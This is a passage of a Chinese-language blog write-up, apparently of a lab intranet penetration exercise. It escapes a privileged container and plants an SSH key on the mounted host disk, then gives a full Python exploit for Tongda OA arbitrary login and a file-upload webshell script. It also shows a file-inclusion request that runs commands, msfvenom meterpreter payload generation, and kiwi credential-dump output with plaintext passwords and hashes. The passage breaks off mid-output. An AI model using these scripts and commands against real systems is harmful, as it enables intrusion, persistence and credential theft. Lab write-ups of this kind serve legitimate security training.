+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/status | grep Cap</span><br><span class="line"></span><br><span class="line">cat /proc/1/status | grep Cap</span><br><span class="line">CapInh: 0000003fffffffff</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>当执行 <code>cat /proc/1/status | grep Cap</code> 查询对应出来的值为 <code>0000003fffffffff</code> 那么就有可能是特权容器，可尝试逃逸</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+<p>还是我们的sda1</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x00063af9</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *        2048 16779263 16777216   8G 83 Linux</span><br><span class="line">/dev/sda2       16781310 20969471  4188162   2G  5 Extended</span><br><span class="line">/dev/sda5       16781312 20969471  4188160   2G 82 Linux swap / Solaris</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/15.png" class title="awa">
+<p>接下来就是重复vulnstack4的操作，检查发现存在ubuntu用户</p>
+<img src="/posts/undefined/16.png" class title="awa">
+<p>然后将我们的key写进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -avx test/home/ubuntu/.ssh/id_rsa.pub test/home/ubuntu/.ssh/authorized_keys # -avx是将权限也一起复制</span><br><span class="line">echo &gt; test/home/ubuntu/.ssh/authorized_keys # 清空authorized_keys文件</span><br><span class="line">echo &#x27;生成的.pub文件的内容&#x27; &gt; test/home/ubuntu/.ssh/authorized_keys # 将ssh秘钥写入authorized_keys文件</span><br></pre></td></tr></table></figure>
+<p>然后我们走proxychains4登入<code>52.20</code>：</p>
+<p>不出意外的肯定是要出意外了，一直登录不进这个机子。那就只能够去爆破<code>/etc/shadow</code>了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu:$1$xJbww$Yknw8dsfh25t02/g2fM9g/:18281:0:99999:7:::</span><br></pre></td></tr></table></figure>
+<p>其实这个key已经爆破过了，就是ubuntu。</p>
+<p>我们直接通过<code>ubuntu/ubuntu</code>连接即可，登录后sudo -i即可拿下root权限：</p>
+<img src="/posts/undefined/17.png" class title="awa">
+<p>接着看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inet addr:192.168.93.10</span><br></pre></td></tr></table></figure>
+<p>由于这里我忘记关掉防火墙了，导致30网段的通达OA无法被连上，因此这里重新操作一下，重新fscan的结果：</p>
+<img src="/posts/undefined/18.png" class title="awa">
+<p>通达oa啊，直接尝试通达oa的洞：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Author         : Sp4ce</span></span><br><span class="line"><span class="string">@Date           : 2020-03-17 23:42:16</span></span><br><span class="line"><span class="string">@LastEditors    : Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime   : 2020-04-22 16:24:52</span></span><br><span class="line"><span class="string">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">f&#x27;socks5://192.168.54.129:6002&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span> : <span class="string">f&#x27;socks5://192.168.54.129:6002&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getV11Session</span>(<span class="params">url</span>):</span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers, proxies=proxies)</span><br><span class="line">        resText = <span class="built_in">str</span>(res.text).split(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">        codeUid = resText[-<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&quot;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(codeUid)</span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">&#x27;CODEUID&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>+codeUid+<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get2017Session</span>(<span class="params">url</span>):</span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/ispirit/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers, proxies=proxies)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        codeUid = resText[<span class="string">&#x27;codeuid&#x27;</span>]</span><br><span class="line">        codeScanUrl = url+<span class="string">&#x27;/general/login_code_scan.php&#x27;</span></span><br><span class="line">        res = requests.post(codeScanUrl, data=&#123;<span class="string">&#x27;codeuid&#x27;</span>: codeUid, <span class="string">&#x27;uid&#x27;</span>: <span class="built_in">int</span>(</span><br><span class="line">            <span class="number">1</span>), <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;pc&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;confirm&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;,headers=headers, proxies=proxies)</span><br><span class="line">        resText = json.loads(res.text)</span><br><span class="line">        status = resText[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> status == <span class="built_in">str</span>(<span class="number">1</span>):</span><br><span class="line">            getCodeUidUrl = url+<span class="string">&#x27;/ispirit/login_code_check.php?codeuid=&#x27;</span>+codeUid</span><br><span class="line">            res = requests.get(getCodeUidUrl, proxies=proxies)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url  + <span class="string">&#x27; Maybe Not Vulnerable ?&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-v&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--tdoaversion&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">        choices=[<span class="number">11</span>, <span class="number">2017</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target TongDa OA Version. e.g: -v 11、-v 2017&quot;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-url&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--targeturl&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1&quot;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.targeturl</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    <span class="keyword">if</span> args.tdoaversion == <span class="number">11</span>:</span><br><span class="line">        getV11Session(url)</span><br><span class="line">    <span class="keyword">elif</span> args.tdoaversion == <span class="number">2017</span>:</span><br><span class="line">        get2017Session(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最常见的就是通达oa前台任意登录。这里直接试一下上面的exp就行了，注意这里配置了socks5代理</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/257154.html">https://www.freebuf.com/vuls/257154.html</a></p>
+<p>后面getshell的流程试这个：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">f&#x27;socks5://192.168.54.129:6002&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span> : <span class="string">f&#x27;socks5://192.168.54.129:6002&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">burp0_data = &#123;</span><br><span class="line">    <span class="string">&quot;UPLOAD_MODE&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;P&quot;</span> : <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DEST_UID&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">burp0_url = <span class="string">&quot;http://192.168.52.30:8080/ispirit/im/upload.php&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;j0rn2m18dmneombpnu3t6klks2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">html = requests.post(burp0_url, cookies=cookies, data=burp0_data, files= &#123;<span class="string">&quot;ATTACHMENT&quot;</span>:(<span class="string">&quot;jpg&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;D:\\lost and found\\CTF\\pcb线下\\Hacking8cms\\01-通达OA\\tdoa_getshell\\attachment.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/jpeg&quot;</span>)&#125;, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(html.request.body)</span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br></pre></td></tr></table></figure>
+<p>自己写的一个python脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+OK [vm]258@2412_62225625|jpg|0[/vm]</span><br></pre></td></tr></table></figure>
+<p>shell的路径是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2412/62225625.jpg</span><br></pre></td></tr></table></figure>
+<p>文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 49.233.3.2:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2007/422124454.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/19.png" class title="awa">
+<p>拿下。接下来尝试弹shell到msf上。这里由于我们写的shell是一个phpshell，我们最好就是直接使用cmd命令行的shell。</p>
+<p>这个姿势是我学弟教我的，很强。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 LHOST=192.168.54.129 -f psh-cmd</span><br></pre></td></tr></table></figure>
+<p>psh-cmd可以生成powshell的命令行，直接在shell里执行即可：</p>
+<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/undefined/21.png" class title="awa">
+<p>记得使用msf之前先配代理（</p>
+<p>先收集一波信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username       Domain       LM              NTLM            SHA1</span><br><span class="line">--------       ------       --              ----            ----</span><br><span class="line">Administrator  WHOAMIANONY  56b0cd8b125c05  ab89b1295e69d3  2bc4124300a6a8f</span><br><span class="line">                            055e2dd9e955f1  53dd7614c7a3a8  c0ca10891823d36</span><br><span class="line">                            8034            0cec            c64e4b3a40</span><br><span class="line">PC1$           WHOAMIANONY                  3e6a3d8c713b48  d8e1318a24c64b8</span><br><span class="line">                                            21eaa51aab25f5  fcc89dc8609b09a</span><br><span class="line">                                            2074            f50342bacf</span><br><span class="line">bunny          WHOAMIANONY  7de10bf327ef7f  cc567d5556030b  3747632756191e3</span><br><span class="line">                            2ac6ebe8776a15  7356ee4915ff09  350e53211c63f80</span><br><span class="line">                            3feb            8c8f            4eb163638f</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username       Domain       Password</span><br><span class="line">--------       ------       --------</span><br><span class="line">(null)         (null)       (null)</span><br><span class="line">Administrator  WHOAMIANONY  Whoami2021</span><br><span class="line">PC1$           WHOAMIANONY  %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9M</span><br><span class="line">                            Twmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrk</span><br><span class="line">                            o+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">bunny          WHOAMIANONY  Bunny2021</span><br><span class="line"></span><br><span class="line">tspkg credentials</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Username       Domain       Password</span><br><span class="line">--------       ------       --------</span><br><span class="line">Administrator  WHOAMIANONY  Whoami2021</span><br><span class="line">bunny          WHOAMIANONY  Bunny2021</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username       Domain           Password</span><br><span class="line">--------       ------           --------</span><br><span class="line">(null)         (null)           (null)</span><br><span class="line">Administrator  WHOAMIANONY.ORG  Whoami2021</span><br><span class="line">bunny          WHOAMIANONY.ORG  Bunny2021</span><br><span class="line">pc1$           whoamianony.org  %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yv</span><br><span class="line">                                w.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5</span><br><span class="line">                                A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">pc1$   